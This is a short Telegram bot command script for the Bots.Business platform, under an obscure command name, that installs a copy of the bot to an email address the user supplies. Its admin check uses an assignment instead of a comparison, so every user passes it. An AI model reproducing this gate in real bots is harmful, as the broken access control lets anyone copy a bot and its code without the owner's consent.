/*CMD
  command: Asdfghjkl
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: Send BB
  keyboard: 
  aliases: 
CMD*/

if (user.telegramid =   1917810534){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("Done")
}else{
Bot.sendMessage("Not admin")
}
